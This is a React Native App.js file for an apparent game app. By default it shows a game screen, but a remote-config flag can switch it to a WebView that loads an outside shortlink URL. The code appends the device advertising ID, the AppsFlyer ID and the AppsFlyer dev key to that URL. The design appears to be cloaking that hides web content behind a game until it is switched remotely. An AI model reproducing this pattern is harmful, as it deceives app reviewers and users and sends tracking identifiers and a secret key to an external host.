/**
 * Sample React Native App
 * https://github.com/facebook/react-native
 *
 * @format
 * @flow strict-local
 */

import React, {useEffect, useState, useRef} from 'react';
import {
	SafeAreaView,
	Alert,
	// Linking,
	// AppState,
} from 'react-native';

import store from 'app_redux/store';
import {Provider} from 'react-redux';

import remoteConfig from '@react-native-firebase/remote-config';
import messaging from '@react-native-firebase/messaging';

import appsFlyer from 'react-native-appsflyer';

import {
	appsflyerDevKey,
	bundleName,
	// intentFilterScheme,
} from './src/constants';

import {IDFA} from 'react-native-idfa';

import GameScreen from 'screens/GameScreen';
import WebViewScreen from 'screens/WebViewScreen';


const App: () => React$Node = () => {
	//get current app state
	// const appState = useRef(AppState.currentState);
	// const [appStateVisible, setAppStateVisible] = useState(appState.current);

	// const handleAppStateChange = (nextAppState) => {
	// 	if (appState.current.match(/inactive|background/) &&
	// 			nextAppState === 'active') {
	// 		// console.log('App has come to the foreground!');
	// 	}

	// 	appState.current = nextAppState;
	// 	setAppStateVisible(appState.current);
	// 	// console.log('App state now: ', appState.current);
	// };

	// useEffect(() => {
	// 	AppState.addEventListener('change', handleAppStateChange);

	// 	return () => {
	// 		AppState.removeEventListener('change', handleAppStateChange);
	// 	};
	// }, []);

	//handle app coming to foreground
	// useEffect(() => {
	// 	// console.log(appStateVisible, 'app state visible')
	// 	if (appStateVisible === 'active') {
	// 		//some handler
	// 	};
	// }, [appStateVisible]);

	//get appsflyer unique device id
	const [appsflyer_id, setAppsflyer_id] = useState('');

	useEffect(() => {
		appsFlyer.getAppsFlyerUID((err, appsflyerUID) => {
			if (err) {
				console.error(err);
			} else {
				// console.log('on getAppsFlyerUID: ' + appsflyerUID);
				setAppsflyer_id(appsflyerUID);
			}
		});
	}, []);

	//subscribe to firebase cloud messaging
	useEffect(() => {
		const unsubscribe = messaging().onMessage(async remoteMessage => {
			Alert.alert('A new FCM message arrived!', JSON.stringify(remoteMessage));
		});

		return unsubscribe;
	}, []);

	//gather remote config value(s) and set appropriate local (state) values
	const [depend_on, setDepend_on] = useState('game');
	const [remoteConfigUrl, setRemoteConfigUrl] = useState('');

	useEffect(() => {
		remoteConfig()
		.setDefaults({
			'depend_on': 'game', //'game' || 'deep_link' || 'remote_config'
			'url': 'http://pagelink.club/QvDtzPX3',

			'webview_enabled': 'false', //'false' || 'true'
			'webview_src': 'none', //'none' || 'deep_link' || 'remote_config'
		})
		.then(() => {
			return remoteConfig().setConfigSettings({
				// minimumFetchIntervalMillis: 10,
				minimumFetchIntervalMillis: 10000,
			})
		})
		.then(() => remoteConfig().fetchAndActivate())
		.then(fetchedRemotely => {
			setDepend_on(remoteConfig().getValue('depend_on').asString());
			setRemoteConfigUrl(remoteConfig().getValue('url').asString());
			if (fetchedRemotely) {
				// console.log('Configs were retrieved from the backend and activated. \n');
			} else {
				// console.log(
				// 	'No configs were fetched from the backend, and the local configs were already activated \n',
				// );
			}
		})
		.catch(er => console.error(er));
	}, []);

	// useEffect(() => {
	// 	// console.log(depend_on, 'depend_on \n');
	// }, [depend_on]);

	//gather deep link uri and set appropriate local (state) value(s)
	// const [deepLinkUri, setDeepLinkUri] = useState('');

	// useEffect(() => {
	// 	Linking.getInitialURL()
	// 	.then(res => {
	// 		const cutIntentFilterSchemeUri =
	// 			res?.slice(intentFilterScheme.length, res.length);
	// 		setDeepLinkUri(cutIntentFilterSchemeUri);
	// 	});
	// }, []);

	// useEffect(() => {
	// 	// console.log(deepLinkUri, 'deep link uri \n');
	// }, [deepLinkUri]);

	//add Linking listener
	// useEffect(() => {
	// 	Linking.addEventListener(deepLinkUri, () => {
	// 		console.log(deepLinkUri, 'OPEN APP LISTENER')
	// 	});

	// 	// return () => Linking.removeAllListeners();
	// }, []);

	//get google advertising id and set local (state) advertising_id value
	const [advertising_id, setAdvertising_id] = useState('');

	useEffect(() => {
		IDFA.getIDFA().then(idfa => {
			setAdvertising_id(idfa);
		})
		.catch(er => console.error(er));
	}, []);

	//set remote config dependent final URL
	const [remoteConfigFinalUrl, setRemoteConfigFinalUrl] = useState('');

	useEffect(() => {
		setRemoteConfigFinalUrl(`${remoteConfigUrl}?app_id=${bundleName}&authentication=${appsflyerDevKey}&appsflyer_id=${appsflyer_id}&advertising_id=${advertising_id}`);
	}, [remoteConfigUrl, bundleName, appsflyerDevKey, appsflyer_id, advertising_id]);

	useEffect(() => {
		console.log('Remote config dependent final uri: ', remoteConfigFinalUrl);
	}, [remoteConfigFinalUrl]);

	//set deep link dependent final URL
	// const [deepLinkFinalUrl, setDeepLinkFinalUrl] = useState('');

	// useEffect(() => {
	// 	setDeepLinkFinalUrl(`${deepLinkUri}?app_id=${bundleName}&authentication=${appsflyerDevKey}&appsflyer_id=${appsflyer_id}&advertising_id=${advertising_id}`)
	// }, [deepLinkUri, bundleName, appsflyerDevKey, appsflyer_id, advertising_id]);

	// useEffect(() => {
	// 	// console.log(deepLinkFinalUrl, 'deep link dependent final uri \n');
	// }, [deepLinkFinalUrl]);

	// INDEPENDENT ONLY GAME SCREEN RENDER

	// return (
	// 	<Provider store={store}>
	// 		<SafeAreaView>
	// 			<GameScreen />
	// 		</SafeAreaView>
	// 	</Provider>
	// );

	// INDEPENDENT ONLY GAME SCREEN RENDER

	return (
		<Provider store={store}>
			<SafeAreaView>
				{depend_on === 'game' && (
					<GameScreen />
				)}
				{depend_on === 'remote_config' && (
					<WebViewScreen url={remoteConfigFinalUrl} />
				)}
				{/* {depend_on === 'deep_link' && (
					<WebViewScreen url={deepLinkFinalUrl} />
				)} */}
			</SafeAreaView>
		</Provider>
	);
};

export default App;